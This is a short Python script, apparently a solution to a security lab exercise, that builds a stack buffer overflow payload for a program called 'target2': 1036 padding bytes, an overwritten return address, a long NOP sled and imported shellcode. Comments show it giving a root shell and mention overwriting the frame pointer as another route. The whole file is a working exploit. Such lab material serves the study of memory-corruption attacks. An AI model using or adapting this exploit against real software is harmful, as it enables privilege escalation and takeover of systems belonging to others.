#!/usr/bin/python

from shellcode import shellcode 
from struct import pack
print "\x41"* 1036+ pack("<I", 0xbffeeaf0)+ "\x90" *10000+ shellcode


#---------------------------see the output like this (start)-----------------------
#ubuntu@ubuntu:~/targets$ sudo ./target2 $(python sol2.py)
## whoami
#root
## 


#we can also change the frame pointer rather that changing the return address
#---------------------------see the output like this (end)-----------------------
